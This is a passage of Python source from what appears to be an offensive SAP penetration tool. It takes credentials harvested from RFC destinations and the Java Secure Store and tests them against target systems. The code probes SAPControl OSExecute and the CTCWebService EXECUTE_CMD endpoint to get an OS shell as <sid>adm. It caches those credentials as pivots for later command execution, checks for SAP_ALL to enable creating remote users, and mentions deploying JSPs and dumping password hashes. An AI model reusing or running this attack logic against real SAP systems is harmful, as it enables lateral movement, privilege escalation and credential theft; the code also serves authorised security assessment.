                        if _oh:
                            conn.target_os_hint = _oh
                            print(f"[+] {dest_name}: target OS "
                                  f"detected via probe: {_oh}")
                        # Placeholder-target promotion.  The SAPControl
                        # response is ground truth: it came from the
                        # target's own GetInstanceProperties call.
                        # RFC destination names, hostname-derived
                        # placeholders (like "NCM" from srv01sm1.
                        # ncmi.co via _derive_sid taking 3 chars off
                        # "ncmi"), and RFCDISC_-shaped placeholders
                        # are ALL heuristic guesses that should defer
                        # to the authoritative reply.  Rename
                        # whenever SAPControl says something different
                        # from the current SID.  If a real node with
                        # that SID is already on the map, merge into
                        # it (target_sid re-pointed, placeholder
                        # deleted) so we don't end up with duplicate
                        # boxes.
                        _real_sid = (_sc_result.get("sid")
                                      or "").strip().upper()
                        _real_inst = (_sc_result.get("instance_nr")
                                       or "").strip()
                        _real_host = (_sc_result.get("hostname")
                                       or "").strip()
                        if (conn.target_sid
                                and _real_sid
                                and len(_real_sid) == 3
                                and _real_sid.isalnum()
                                and _real_sid != conn.target_sid):
                            _old = conn.target_sid
                            # If a node already exists with the
                            # real SID (operator explicitly
                            # scanned SJ1 earlier), merge:
                            # re-point every connection at the
                            # real one, remove the placeholder.
                            _existing = api.state.get_node(_real_sid)
                            if _existing is not None:
                                for _c in api.state.connections:
                                    if _c.target_sid == _old:
                                        _c.target_sid = _real_sid
                                    if _c.source_sid == _old:
                                        _c.source_sid = _real_sid
                                api.state.remove_node(_old)
                                conn.target_sid = _real_sid
                                print(f"[+] {dest_name}: merged "
                                      f"placeholder {_old} into "
                                      f"existing node "
                                      f"{_real_sid} — SAPControl "
                                      f"identity match")
                            else:
                                err = api.state.rename_node_sid(
                                    _old, _real_sid)
                                if not err:
                                    conn.target_sid = _real_sid
                                    print(f"[+] {dest_name}: "
                                          f"promoted node "
                                          f"{_old} → {_real_sid} "
                                          f"(SAPControl reply is "
                                          f"authoritative)")
                                else:
                                    print(f"[!] {dest_name}: could "
                                          f"not rename {_old} → "
                                          f"{_real_sid}: {err}")
                        # Even without a rename, backfill any
                        # identity fields we now know but the node
                        # is missing.
                        _tgt_node = (
                            api.state.get_node(conn.target_sid)
                            if conn.target_sid else None)
                        if _tgt_node:
                            if _real_host and not _tgt_node.hostname:
                                _tgt_node.hostname = _real_host
                            # Backfill os_type from the uname probe
                            # result so System Details reflects the
                            # detected OS.  Placeholder targets land
                            # here with os_type='' — the uname probe
                            # is ground truth (came from actually
                            # running a command).  Use the raw uname
                            # output when Unix ("Linux", "AIX",
                            # "Darwin", …) so the operator can tell
                            # distros apart; "Windows NT" for the
                            # Windows case.  Don't overwrite an
                            # explicit os_type the operator set.
                            _os_name = (
                                _sc_result.get("os_name") or "").strip()
                            if _os_name and not (
                                    _tgt_node.os_type or "").strip():
                                _tgt_node.os_type = _os_name
                                print(f"[+] {dest_name}: backfilled "
                                      f"{conn.target_sid}.os_type = "
                                      f"{_os_name!r} from SAPControl "
                                      f"uname probe")
                            # Backfill system_type from the stack
                            # hint derived from SAPControl's
                            # INSTANCE_NAME (J* / JC* → JAVA,
                            # D* / ASCS* → ABAP, HDB* → HANA).
                            # Without this, placeholder targets stay
                            # system_type='' and the Java-only menu
                            # items ('Download Java Secure Store',
                            # 'Read Java Destinations', etc.) stay
                            # hidden — collapsing the whole Data
                            # Extraction submenu because it has no
                            # actionable items left.
                            _stack_hint = (
                                _sc_result.get("stack_hint")
                                or "").strip().upper()
                            _cur_stack = (
                                _tgt_node.system_type or "").upper()
                            if (_stack_hint
                                    and _stack_hint not in _cur_stack):
                                _tgt_node.system_type = (
                                    f"{_cur_stack}+{_stack_hint}"
                                    if _cur_stack else _stack_hint)
                                print(f"[+] {dest_name}: backfilled "
                                      f"{conn.target_sid}.system_type "
                                      f"→ {_tgt_node.system_type!r} "
                                      f"(from SAPControl "
                                      f"INSTANCE_NAME)")
                            if _real_inst:
                                # Add / update the instance entry.
                                _found = False
                                for _ii in _tgt_node.instances:
                                    if _ii.instance_nr == _real_inst:
                                        _found = True
                                        break
                                if not _found:
                                    from sapmap_models import (
                                        InstanceInfo)
                                    _tgt_node.instances.append(
                                        InstanceInfo(
                                            instance_nr=_real_inst,
                                            ip=_tgt_node.ip
                                               or _real_host,
                                            ports={}))
                                conn.target_instance_nr = _real_inst
                        _identity = (f"SID={_sc_result['sid'] or '?'} "
                                     f"inst={_sc_result['instance_nr'] or '?'} "
                                     f"host={_sc_result['hostname'] or '?'}")
                        if _osx == 1:
                            print(f"[+] {dest_name}: SAPControl auth OK — "
                                  f"{_identity} — OSExecute AccessCheck "
                                  f"passed, OS access unlocked")
                        elif _osx == 0:
                            print(f"[-] {dest_name}: SAPControl endpoint "
                                  f"reachable ({_identity}) but "
                                  f"credential lacks OSExecute authz "
                                  f"(AccessCheck returned <access>0</access>)")
                        else:
                            _ace = (_sc_result.get("access_check_error")
                                     or "AccessCheck failed").strip()
                            print(f"[-] {dest_name}: SAPControl endpoint "
                                  f"reachable ({_identity}) but "
                                  f"credential validation failed — "
                                  f"{_ace}")
                        # Cache the SAPControl pivot on the TARGET
                        # node so execute_os_command (and every
                        # downstream helper — _deploy_jsp_via_gw,
                        # extract_java_secstore, download hashes,
                        # read_table, ...) transparently routes
                        # OS-exec calls through this channel without
                        # threading URL/user/pwd through every
                        # signature.  Mirrors the _cached_soap_route
                        # pattern used for the SOAP-RFC fallback.
                        if (conn.os_exec_verified
                                and conn.target_sid):
                            _tgt_cache = api.state.get_node(
                                conn.target_sid)
                            if _tgt_cache is not None:
                                _tgt_cache._cached_sapcontrol_pivot = {
                                    "url": conn.http_url or "",
                                    "user": conn.rfc_user or "",
                                    "password": (
                                        conn.secstore_password
                                        or ""),
                                    "os_hint": (
                                        conn.target_os_hint or ""),
                                    "via_destination": (
                                        conn.destination_name),
                                    "via_source_sid": (
                                        conn.source_sid),
                                }
                                print(f"[+] {dest_name}: cached "
                                      f"SAPControl OSExecute pivot "
                                      f"on {conn.target_sid} — "
                                      f"downstream OS-exec now "
                                      f"routes via {conn.http_url}")
                        # CRITICAL finding fires only when we've
                        # actually proven the credential unlocks
                        # OSExecute — a reachable-but-unauthenticated
                        # SAPControl endpoint isn't a compromise.
                        if conn.os_exec_verified and conn.target_sid:
                            try:
                                from sapmap_findings import (
                                    emit_finding)
                                emit_finding(
                                    "CRITICAL", conn.source_sid,
                                    f"RFC destination {dest_name!r} "
                                    f"unlocks OS shell as {rfc_user} "
                                    f"on {conn.target_sid} via "
                                    f"SAPControl OSExecute — full "
                                    f"kernel-level pivot confirmed",
                                    meta={"source_sid": conn.source_sid,
                                          "target_sid": conn.target_sid},
                                )
                            except Exception:
                                pass
                            tgt = api.state.get_node(conn.target_sid)
                            if tgt:
                                tgt.has_critical_finding = True
                    else:
                        print(f"[-] {dest_name}: SAPControl auth probe "
                              f"failed — HTTP "
                              f"{_sc_result['status'] or '?'} "
                              f"({_sc_result['error'][:120]})")
                # Java-shaped target: URL port matches 5NN00/5NN01
                # (Java HTTP/HTTPS), or the target node is explicitly
                # tagged JAVA/BTP, or is_ads_dest (ADS = Java only),
                # or the URL host suggests BTP.  SOAP-RFC RFC_PING
                # would XML-parse-error against these endpoints
                # because the response isn't a SOAP envelope — use a
                # basic HTTP auth probe instead.
                _did_java_probe = False
                if (rfc_user and rfc_pwd
                        and not (conn.os_access_type or "").startswith(
                            ("sapcontrol", "hostagent"))):
                    _target_is_java = False
                    _target_is_btp = getattr(conn, "is_btp_dest", False)
                    _is_ads = getattr(conn, "is_ads_dest", False)
                    try:
                        from urllib.parse import urlparse as _up_j
                        _p = _up_j(conn.http_url or "")
                        _url_port = _p.port or 0
                        # 5NN00 / 5NN01 = Java HTTP/HTTPS.  Excludes
                        # 5NN13/5NN14 which are SAPControl (handled
                        # above) and 5NN08 which is the admin telnet.
                        if (50000 <= _url_port <= 59999
                                and _url_port % 100 in (0, 1)):
                            _target_is_java = True
                    except Exception:
                        pass
                    _tgt = (api.state.get_node(conn.target_sid)
                             if conn.target_sid else None)
                    if _tgt:
                        _st = (_tgt.system_type or "").upper()
                        if "JAVA" in _st and "ABAP" not in _st:
                            _target_is_java = True
                        if "BTP" in _st:
                            _target_is_btp = True

                    if _target_is_java or _target_is_btp or _is_ads:
                        _did_java_probe = True
                        _label = ("BTP" if _target_is_btp
                                   else "ADS/Java" if _is_ads
                                   else "Java")
                        print(f"[*] {dest_name}: {_label} target — basic "
                              f"HTTP auth probe on {conn.http_url} as "
                              f"{rfc_user}...")
                        _ba = sapmap_rfc.http_basic_auth_probe(
                            conn.http_url, rfc_user, rfc_pwd,
                            timeout=8.0)
                        if _ba.get("logon_successful"):
                            conn.logon_successful = True
                            # NOTE: don't set soap_rfc_verified here.
                            # That flag specifically means "ABAP
                            # SOAP-RFC RFC_PING works" and gates the
                            # Create Remote User button — but Java /
                            # BTP / ADS targets can't do BAPI_USER_CREATE1
                            # over SOAP-RFC.  Basic-auth pass on a
                            # Java target proves the credential is
                            # live for UME/HTTP use, nothing more.
                            print(f"[+] {dest_name}: HTTP "
                                  f"{_ba['status']} — credential "
                                  f"accepted on {_label} target")
                            if _tgt:
                                _tgt.has_critical_finding = True
                            # CTCWebService pivot probe.  A live UME
                            # credential with Administrator role
                            # unlocks /CTCWebService/CTCWebServiceBean
                            # FileSystemConfig/EXECUTE_CMD → shell as
                            # <sid>adm on the Java stack's HTTP port.
                            # Skip BTP / ADS — those aren't standard
                            # NetWeaver Java stacks and don't expose
                            # CTCWebService.  Basic-auth succeeded
                            # here so we know rfc_user / rfc_pwd are
                            # good; the probe just confirms the UME
                            # role and endpoint availability.
                            if (_target_is_java
                                    and not _target_is_btp
                                    and not _is_ads):
                                # Cached verdict — SAP Note 2757006
                                # has stripped the FileSystemConfig
                                # provider on this target.  Auth still
                                # passes, but EXECUTE_CMD is gone;
                                # every fresh credential ends up
                                # returning the same ASJ.ejb.005043
                                # wrapper.  Skip the ~8 s probe.
                                _skip_ctc = False
                                if _tgt is not None and getattr(
                                        _tgt,
                                        "_ctcws_provider_stripped",
                                        False):
                                    print(f"[*] {dest_name}: "
                                          f"CTCWebService probe skipped "
                                          f"— {conn.target_sid} "
                                          f"previously returned "
                                          f"ASJ.ejb.005043 "
                                          f"(FileSystemConfig provider "
                                          f"stripped, SAP Note 2757006)")
                                    _cws_r = {"ok": True, "status": 500,
                                              "error": ("cached: provider "
                                                        "stripped per SAP "
                                                        "Note 2757006"),
                                              "os_exec_verified": False,
                                              "provider_stripped": True}
                                    _skip_ctc = True
                                if not _skip_ctc:
                                    print(f"[*] {dest_name}: CTCWebService "
                                          f"auth probe on {conn.http_url} "
                                          f"as {rfc_user}...")
                                    try:
                                        import sap_java_ctcws as _cws
                                        _cws_r = _cws.ctcws_auth_probe(
                                            conn.http_url, rfc_user, rfc_pwd,
                                            timeout=10.0)
                                    except Exception as _e:
                                        _cws_r = {"ok": False,
                                                  "status": 0,
                                                  "error": f"probe crashed: {_e}",
                                                  "os_exec_verified": False}
                                if _cws_r.get("os_exec_verified"):
                                    conn.os_exec_verified = True
                                    conn.os_exec_channel = "ctcws"
                                    _oh = (_cws_r.get("os_hint")
                                            or "").strip()
                                    if _oh:
                                        conn.target_os_hint = _oh
                                    print(f"[+] {dest_name}: "
                                          f"CTCWebService OSExecute "
                                          f"unlocked — shell as "
                                          f"<sid>adm via "
                                          f"FileSystemConfig/"
                                          f"EXECUTE_CMD")
                                    if _tgt:
                                        # Backfill os_type from the
                                        # uname line the probe parsed.
                                        _os_name = (
                                            _cws_r.get("os_name")
                                            or "").strip()
                                        if (_os_name
                                                and not (_tgt.os_type
                                                          or "").strip()):
                                            _tgt.os_type = _os_name
                                            print(f"[+] {dest_name}: "
                                                  f"backfilled "
                                                  f"{conn.target_sid}"
                                                  f".os_type = "
                                                  f"{_os_name!r} "
                                                  f"from CTCWebService "
                                                  f"uname probe")
                                        # A pure placeholder can land
                                        # here with system_type='' —
                                        # nudge it toward JAVA so the
                                        # Java-only menu items become
                                        # visible.
                                        _cur_stack = (
                                            _tgt.system_type
                                            or "").upper()
                                        if "JAVA" not in _cur_stack:
                                            _tgt.system_type = (
                                                f"{_cur_stack}+JAVA"
                                                if _cur_stack else "JAVA")
                                            print(f"[+] {dest_name}: "
                                                  f"backfilled "
                                                  f"{conn.target_sid}"
                                                  f".system_type → "
                                                  f"{_tgt.system_type!r} "
                                                  f"(CTCWebService "
                                                  f"confirms Java "
                                                  f"stack)")
                                        _tgt.has_critical_finding = True
                                    # Cache pivot on target node so
                                    # execute_os_command routes
                                    # transparently — mirrors the
                                    # SAPControl pivot pattern.
                                    if conn.target_sid:
                                        _tgt_cache = api.state.get_node(
                                            conn.target_sid)
                                        if _tgt_cache is not None:
                                            _tgt_cache._cached_ctcws_pivot = {
                                                "url": conn.http_url or "",
                                                "user": rfc_user,
                                                "password": rfc_pwd,
                                                "os_hint": (
                                                    conn.target_os_hint
                                                    or ""),
                                                "via_destination": (
                                                    conn.destination_name),
                                                "via_source_sid": (
                                                    conn.source_sid),
                                            }
                                            print(f"[+] {dest_name}: "
                                                  f"cached CTCWebService "
                                                  f"pivot on "
                                                  f"{conn.target_sid} — "
                                                  f"downstream OS-exec "
                                                  f"now routes via "
                                                  f"{conn.http_url}")
                                    if conn.target_sid:
                                        try:
                                            emit_finding(
                                                "CRITICAL",
                                                conn.source_sid,
                                                f"RFC destination "
                                                f"{dest_name!r} unlocks "
                                                f"OS shell as {rfc_user} "
                                                f"on {conn.target_sid} "
                                                f"via CTCWebService "
                                                f"FileSystemConfig/"
                                                f"EXECUTE_CMD — full "
                                                f"kernel-level pivot",
                                                meta={
                                                  "source_sid":
                                                    conn.source_sid,
                                                  "target_sid":
                                                    conn.target_sid,
                                                  "channel": "ctcws"},
                                            )
                                        except Exception:
                                            pass
                                else:
                                    _st = _cws_r.get("status") or "?"
                                    _er = (_cws_r.get("error")
                                            or "no error text")[:140]
                                    print(f"[-] {dest_name}: "
                                          f"CTCWebService probe did "
                                          f"not unlock OS-exec "
                                          f"(HTTP {_st}: {_er})")
                                    # ASJ.ejb.005043 verdict — SAP Note
                                    # 2757006 stripped the
                                    # FileSystemConfig / EXECUTE_CMD
                                    # provider on this target.  Cache
                                    # the flag so a manual re-test on
                                    # a sibling destination (same
                                    # Java stack, different URL) or a
                                    # future AutoPwn wave doesn't burn
                                    # another 8-s probe on the same
                                    # dead endpoint.  Emit a MEDIUM
                                    # finding once so the operator
                                    # sees the note reference in the
                                    # report even though it's a dead
                                    # end.
                                    if (_cws_r.get("provider_stripped")
                                            and conn.target_sid
                                            and _tgt is not None
                                            and not getattr(
                                                _tgt,
                                                "_ctcws_provider_stripped",
                                                False)):
                                        _tgt._ctcws_provider_stripped = True
                                        print(f"[*] {conn.target_sid}: "
                                              f"CTCWebService "
                                              f"FileSystemConfig "
                                              f"provider stripped "
                                              f"(SAP Note 2757006 "
                                              f"applied) — cached; "
                                              f"future probes will "
                                              f"skip this endpoint")
                                        try:
                                            emit_finding(
                                                "MEDIUM",
                                                conn.target_sid,
                                                f"CTCWebService/"
                                                f"FileSystemConfig/"
                                                f"EXECUTE_CMD "
                                                f"unavailable on "
                                                f"{conn.target_sid} — "
                                                f"endpoint present but "
                                                f"returns "
                                                f"ASJ.ejb.005043 "
                                                f"(provider stripped "
                                                f"per SAP Note "
                                                f"2757006).  Auth "
                                                f"channel is fine; "
                                                f"the OS-exec "
                                                f"provider chain is "
                                                f"gone.",
                                                ref="ctcws.provider_stripped",
                                                meta={
                                                  "target_sid":
                                                    conn.target_sid,
                                                  "note": "2757006"},
                                            )
                                        except Exception:
                                            pass
                        elif _ba.get("ok"):
                            print(f"[-] {dest_name}: HTTP "
                                  f"{_ba['status']} — credential "
                                  f"rejected ({_ba['error']})")
                        else:
                            print(f"[-] {dest_name}: HTTP probe "
                                  f"failed ({_ba['error'][:120]})")
                    else:
                        # ABAP target (or unknown) — fall through to
                        # the direct-RFC + SOAP-RFC RFC_PING cascade
                        # below by dropping into the ABAP branch.
                        pass
                # ABAP branch — fires ONLY when the Java branch above
                # didn't run (target wasn't Java-shaped) AND the
                # SAPControl branch didn't handle it either.  A Java
                # target that returned 401 to basic auth is a valid
                # negative result; falling through to the ABAP RFC
                # cascade would produce the ugly XML parse error the
                # operator reported.
                if (not conn.logon_successful and not _did_java_probe
                        and rfc_user and rfc_pwd and conn.target_sid
                        and not (conn.os_access_type or "").startswith(
                            ("sapcontrol", "hostagent"))):
                    target_node = api.state.get_node(conn.target_sid)
                    if target_node and "ABAP" in (
                            target_node.system_type or "ABAP").upper():
                        target_inst = _probed_inst or (
                            (conn.target_instance_nr or "").strip()
                            or (target_node.instance_nrs()[0]
                                if target_node.instance_nrs()
                                else "00"))
                        target_client = conn.client or "000"
                        direct_creds = Credentials(
                            username=rfc_user,
                            password=rfc_pwd,
                            client=target_client,
                            instance_nr=target_inst,
                        )

                        # Phase 3a: skip direct RFC entirely if the
                        # gateway port (sapgw<NN> = 33NN) is unreachable
                        # from this host.  External RFC clients connect
                        # to the GATEWAY, not the dispatcher (32NN —
                        # that's the SAPGUI/DIAG port).  Saves a 60-90s
                        # pyrfc TCP retry storm on firewalled landscapes
                        # — the exact case Type-G/H HTTP destinations
                        # exist to solve.
                        gateway_port = int(f"33{target_inst}")
                        gateway_host = (
                            target_node.ip or target_node.hostname
                            or "")
                        skip_direct = False
                        if gateway_host:
                            import socket as _sck
                            sk = _sck.socket(
                                _sck.AF_INET, _sck.SOCK_STREAM)
                            sk.settimeout(2.0)
                            try:
                                sk.connect((gateway_host,
                                            gateway_port))
                                sk.close()
                            except Exception:
                                skip_direct = True
                                print(f"[*] {dest_name}: gateway "
                                      f"{gateway_host}:"
                                      f"{gateway_port} unreachable "
                                      f"— skipping direct RFC, will "
                                      f"use SOAP-RFC")

                        direct_ok = False
                        if not skip_direct:
                            print(f"[*] {dest_name}: trying direct RFC "
                                  f"logon to {conn.target_sid} as "
                                  f"{rfc_user} (inst {target_inst})...")
                            try:
                                if sapmap_rfc.test_connection(
                                        target_node, direct_creds):
                                    direct_ok = True
                                    conn.logon_successful = True
                                    print(f"[+] {dest_name}: RFC logon "
                                          f"OK on {conn.target_sid}")
                                    info = (
                                        sapmap_rfc.
                                        get_direct_user_profiles(
                                            target_node, rfc_user,
                                            direct_creds))
                                    conn.profiles = info.get(
                                        "profiles", [])
                                    conn.roles = info.get("roles", [])
                                    conn.has_sap_all = info.get(
                                        "has_sap_all", False)
                                    conn.user_detail_error = info.get(
                                        "error", "")
                                    if conn.has_sap_all:
                                        print(f"[!] {rfc_user}@"
                                              f"{conn.target_sid} has "
                                              f"SAP_ALL — 'Create "
                                              f"Remote User' now "
                                              f"available")
                                        target_node.has_critical_finding = True
                                        api.state.notify_sap_all_if_elevated(
                                            conn)
                                    elif conn.profiles or conn.roles:
                                        p_str = ", ".join(
                                            conn.profiles[:5]) or "<none>"
                                        print(f"[*] {rfc_user}@"
                                              f"{conn.target_sid}: "
                                              f"profiles=[{p_str}]")
                                else:
                                    print(f"[-] {dest_name}: RFC "
                                          f"logon rejected on "
                                          f"{conn.target_sid}")
                            except Exception as e:
                                print(f"[-] {dest_name}: RFC logon "
                                      f"failed — {str(e)[:120]}")

                        # Phase 3a SOAP-RFC fallback — runs when direct
                        # RFC was skipped or failed.  Verifies the
                        # credentials via RFC_PING over HTTP.  Doesn't
                        # check SAP_ALL (that's Phase 3b); instead it
                        # sets soap_rfc_verified so the Create Remote
                        # User button is offered with a "will attempt
                        # at click time" caveat.
                        if not direct_ok:
                            endpoint = _resolve_soap_endpoint(
                                conn, target_node)
                            if endpoint["ok"]:
                                print(f"[*] {dest_name}: trying "
                                      f"SOAP-RFC RFC_PING on "
                                      f"{endpoint['host']}:"
                                      f"{endpoint['port']} as "
                                      f"{rfc_user}...")
                                from sap_soap_basic import (
                                    SOAPRFCSession)
                                soap_sess = SOAPRFCSession(
                                    host=endpoint["host"],
                                    port=endpoint["port"],
                                    client=target_client,
                                    user=rfc_user,
                                    password=rfc_pwd,
                                    https=endpoint["https"],
                                )
                                ping = soap_sess.test_connection()
                                if ping["ok"]:
                                    conn.logon_successful = True
                                    conn.soap_rfc_verified = True
                                    print(f"[+] {dest_name}: SOAP-RFC "
                                          f"RFC_PING OK — password "
                                          f"verified over HTTP")
                                    target_node.has_critical_finding = True

                                    # Phase 3b: fill OS / Database /
                                    # Kernel / SAP Release rows in the
                                    # System Details modal via
                                    # RFC_GET_SYSTEM_INFO over SOAP.
                                    try:
                                        sysinfo = (
                                            soap_sess.get_system_info())
                                    except Exception:
                                        sysinfo = {"ok": False,
                                                   "info": {}}
                                    if sysinfo.get("ok"):
                                        si = sysinfo["info"]
                                        if (si.get("RFCOPSYS")
                                                and not target_node.os_type):
                                            target_node.os_type = (
                                                si["RFCOPSYS"].strip())
                                        if (si.get("RFCDBSYS")
                                                and not target_node.db_type):
                                            target_node.db_type = (
                                                si["RFCDBSYS"].strip())
                                        if (si.get("RFCKERNRL")
                                                and not target_node.kernel):
                                            target_node.kernel = (
                                                si["RFCKERNRL"].strip())
                                        if (si.get("RFCSAPRL")
                                                and not target_node.sap_release):
                                            target_node.sap_release = (
                                                si["RFCSAPRL"].strip())
                                        print(f"[+] {conn.target_sid}: "
                                              f"system info via SOAP "
                                              f"— kernel "
                                              f"{si.get('RFCKERNRL','?')} "
                                              f"release "
                                              f"{si.get('RFCSAPRL','?')} "
                                              f"OS "
                                              f"{si.get('RFCOPSYS','?')} "
                                              f"DB "
                                              f"{si.get('RFCDBSYS','?')}")

                                    # Phase 3b: read T000 clients via
                                    # SOAP so the Clients section
                                    # gets P/C/T/D categories instead
                                    # of only the verified-V entry.
                                    try:
                                        tr = soap_sess.read_table(
                                            "T000",
                                            fields=["MANDT",
                                                    "CCCATEGORY",
                                                    "MTEXT"])
                                    except Exception:
                                        tr = {"ok": False, "rows": []}
                                    if tr.get("ok") and tr["rows"]:
                                        existing_v = {
                                            c["nr"]: c for c in
                                            target_node.clients
                                            if c.get("category") == "V"}
                                        # Merge: keep V-category
                                        # entries that aren't returned
                                        # by T000 read.  Replace
                                        # everything else with the
                                        # authoritative T000 view.
                                        new_clients = []
                                        seen = set()
                                        for r in tr["rows"]:
                                            nr = r.get("MANDT", "").zfill(3)
                                            if not nr:
                                                continue
                                            new_clients.append({
                                                "nr": nr,
                                                "category": r.get(
                                                    "CCCATEGORY", ""),
                                                "mtext": r.get(
                                                    "MTEXT", ""),
                                            })
                                            seen.add(nr)
                                        # Preserve V markers for
                                        # clients absent from T000
                                        # (defensive — shouldn't
                                        # happen, but never lose
                                        # verification provenance).
                                        for nr, v in existing_v.items():
                                            if nr not in seen:
                                                new_clients.append(v)
                                        target_node.clients = new_clients
                                        print(f"[+] {conn.target_sid}: "
                                              f"T000 read via SOAP — "
                                              f"{len(new_clients)} "
                                              f"client(s) enumerated")

                                    # Follow-up: read profiles + roles
                                    # via BAPI_USER_GET_DETAIL so the
                                    # modal shows actual SAP_ALL state
                                    # without waiting for click-time.
                                    print(f"[*] {dest_name}: reading "
                                          f"profiles via SOAP "
                                          f"BAPI_USER_GET_DETAIL "
                                          f"for {rfc_user}...")
                                    detail = soap_sess.get_user_profiles(
                                        rfc_user)
                                    if detail["ok"]:
                                        conn.profiles = detail["profiles"]
                                        conn.roles = detail["roles"]
                                        conn.has_sap_all = (
                                            detail["has_sap_all"])
                                        conn.user_detail_error = ""
                                        if conn.has_sap_all:
                                            print(f"[!] {rfc_user}@"
                                                  f"{conn.target_sid} "
                                                  f"has SAP_ALL via "
                                                  f"SOAP-RFC — 'Create "
                                                  f"Remote User' "
                                                  f"available")
                                            api.state.notify_sap_all_if_elevated(
                                                conn)
                                        elif conn.profiles:
                                            p_str = ", ".join(
                                                conn.profiles[:5])
                                            print(f"[*] {rfc_user}@"
                                                  f"{conn.target_sid}:"
                                                  f" profiles=[{p_str}]"
                                                  f" (no SAP_ALL)")
                                    else:
                                        # Profile read rejected (likely
                                        # S_USER_GRP missing on rfc_user).
                                        # Surface it but keep
                                        # soap_rfc_verified True so the
                                        # click-time-check path stays.
                                        err = detail.get(
                                            "error", "")[:120]
                                        conn.user_detail_error = (
                                            f"SOAP profile read failed:"
                                            f" {err}")
                                        print(f"[-] {dest_name}: "
                                              f"SOAP profile read "
                                              f"failed — {err}")
                                else:
                                    err = ping.get("error", "")[:120]
                                    print(f"[-] {dest_name}: "
                                          f"SOAP-RFC RFC_PING failed "
                                          f"— {err}")
                            else:
                                print(f"[-] {dest_name}: no SOAP-RFC "
                                      f"endpoint — {endpoint['error']}")

                print(f"[+] Single test done for {dest_name}")
                return

            # If we have a SecStore password, try direct connection to the
            # target first — this bypasses the source system entirely and
            # works even when the source client is locked (SCC4).
            if conn.secstore_password and conn.rfc_user and conn.target_sid:
                target_node = api.state.get_node(conn.target_sid)
                if target_node:
                    target_client = conn.client or "000"
                    # Prefer the JCo-destination sysnr captured from the
                    # Java SecStore.  Without it, a destination targeting
                    # sysnr 40 falls back to the first registered instance
                    # (often 00) and hits the wrong gateway port (3300
                    # instead of 3340) — RFC_COMMUNICATION_FAILURE.
                    target_inst = (
                        (conn.target_instance_nr or "").strip()
                        or (target_node.instance_nrs()[0]
                            if target_node.instance_nrs() else "00"))
                    print(f"[*] Testing {dest_name} via direct RFC to "
                          f"{conn.target_sid} (SecStore password)...")
                    direct_creds = Credentials(
                        username=conn.rfc_user,
                        password=conn.secstore_password,
                        client=target_client,
                        instance_nr=target_inst,
                    )
                    # Host candidates — prefer the RFCDES-stored host
                    # (what the destination actually uses in real SAP
                    # calls) over the discovery-derived node IP.  In
                    # multi-network landscapes these differ: e.g. dest
                    # on SJJ stores 172.31.8.88 (internal to reach
                    # S4D) while discovery found S4D at 172.31.35.41
                    # via a different route.  Operator-reported: the
                    # test was failing on the discovered IP even
                    # though the destination's own IP would have
                    # worked from SAPMAP too.
                    _host_candidates = []
                    for _h in (conn.target_ip, conn.target_host,
                                target_node.ip, target_node.hostname):
                        _h = (_h or "").strip()
                        if _h and _h not in _host_candidates:
                            _host_candidates.append(_h)
                    try:
                        _test_ok = False
                        for _h in _host_candidates:
                            if sapmap_rfc.test_connection(
                                    target_node, direct_creds,
                                    host_override=_h):
                                _test_ok = True
                                break
                        if _test_ok:
                            conn.logon_successful = True
                            conn.logon_tested = True
                            conn.ping_ok = True
                            conn.tested = True
                            print(f"[+] {dest_name}: Direct logon OK "
                                  f"({conn.rfc_user}@{conn.target_sid})")
                            # Fetch profiles + roles DIRECTLY on the target
                            # (works for Java sources that have no ABAP
                            # to host RFC_ABAP_INSTALL_AND_RUN).
                            info = sapmap_rfc.get_direct_user_profiles(
                                target_node, conn.rfc_user, direct_creds)
                            # If the RFC-dest user itself can't call
                            # BAPI_USER_GET_DETAIL on the target (common
                            # for service users like TRACE, CPIC_*), the
                            # direct call returns empty/errored.  When
                            # the SOURCE node IS ABAP we can still get
                            # real profile data by running the BAPI
                            # through RFC_ABAP_INSTALL_AND_RUN on the
                            # source with our SAP_ALL creds — same path
                            # ABAP→ABAP edges already use.  Upgrade
                            # whatever the direct call couldn't answer.
                            is_abap_source = "ABAP" in (
                                node.system_type or "").upper()
                            direct_gave_nothing = (
                                not info.get("profiles")
                                and not info.get("roles"))
                            if is_abap_source and direct_gave_nothing:
                                print(f"[*] {dest_name}: direct BAPI on "
                                      f"target returned nothing"
                                      f"{' ('+info.get('error','')[:80]+')' if info.get('error') else ''}"
                                      f" — falling back to "
                                      f"RFC_ABAP_INSTALL_AND_RUN via "
                                      f"source {node.sid}")
                                src_info = sapmap_rfc.get_remote_user_profiles(
                                    node, conn.rfc_user, dest_name, creds)
                                if (src_info.get("profiles")
                                        or src_info.get("has_sap_all")):
                                    info = src_info
                            conn.profiles = info.get("profiles", [])
                            conn.roles = info.get("roles", [])
                            conn.has_sap_all = info.get("has_sap_all", False)
                            conn.user_detail_error = info.get("error", "")
                            if conn.has_sap_all:
                                print(f"[!] {conn.rfc_user}@{conn.target_sid} "
                                      f"has SAP_ALL — edge flipping to red, "
                                      f"'Create Remote User' now available")
                                target_node.has_critical_finding = True
                                api.state.notify_sap_all_if_elevated(conn)
                            elif conn.profiles or conn.roles:
                                p_str = (", ".join(conn.profiles[:5])
                                         + ("…" if len(conn.profiles) > 5
                                            else "")) or "<none>"
                                r_str = (", ".join(conn.roles[:5])
                                         + ("…" if len(conn.roles) > 5
                                            else "")) or "<none>"
                                print(f"[*] {conn.rfc_user}@{conn.target_sid}: "
                                      f"profiles=[{p_str}] roles=[{r_str}] "
                                      f"— no SAP_ALL")
                            elif conn.user_detail_error:
                                print(f"[*] {conn.rfc_user}@{conn.target_sid}: "
                                      f"could not read profiles "
                                      f"({conn.user_detail_error[:120]}) "
                                      f"— SAP_ALL status unknown")
                            return
                    except Exception as e:
                        print(f"[-] Direct test failed: {e}")

            # Skip the ABAP /SDF/RFC_CHECK fallback if the source node
            # is Java-only (no ABAP to run the FM on), or if the only
            # credential we have is a Java UME user with empty client
            # (the NW RFC SDK would reject it with 'Invalid CLIENT
            # format' before even reaching the network).
            is_java_only = ("JAVA" in (node.system_type or "").upper()
                            and "ABAP" not in (node.system_type or "").upper())
            client_numeric = ((creds.client if creds else "") or "").strip()
            has_valid_client = client_numeric.isdigit()
            if is_java_only or not has_valid_client:
                reason = ("source is Java-only, no ABAP /SDF/RFC_CHECK FM"
                          if is_java_only else
                          f"best credential has no numeric client "
                          f"(got {client_numeric!r} — likely a Java UME "
                          f"user from RECON)")
                print(f"[*] {dest_name}: skipping ABAP RFC-destination "
                      f"test — {reason}")
                conn.logon_successful = False
                conn.logon_tested = True
                conn.tested = True
                if not conn.logon_successful:
                    print(f"[-] {dest_name}: Logon not tested "
                          f"(need direct test with SecStore password above)")
                print(f"[+] Single test done for {dest_name}")
                return

